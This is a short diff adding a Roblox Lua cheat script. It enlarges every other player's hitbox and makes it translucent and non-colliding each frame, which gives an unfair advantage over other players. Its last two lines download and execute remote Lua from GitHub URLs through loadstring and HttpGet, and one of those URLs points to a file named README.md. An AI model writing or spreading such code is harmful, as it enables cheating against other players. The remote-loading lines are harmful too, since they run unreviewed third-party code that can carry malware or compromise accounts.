@@ -1,0 +1,14 @@
+game:GetService('RunService').RenderStepped:connect(function()
+    for i,v in next, game:GetService('Players'):GetPlayers() do
+        if v.Name ~= game:GetService('Players').LocalPlayer.Name then
+            v.Character.HumanoidRootPart.Size = Vector3.new(50,50,50)
+            v.Character.HumanoidRootPart.Color = Color3.new(255,255,255)
+            v.Character.HumanoidRootPart.Transparency = 0.9
+            v.Character.HumanoidRootPart.Material = "Neon"
+            v.Character.HumanoidRootPart.CanCollide = false
+        end
+    end
+end)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LazzySensai/GUI/main/Lazzy"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LazzySensai/Bounty/main/README.md"))()
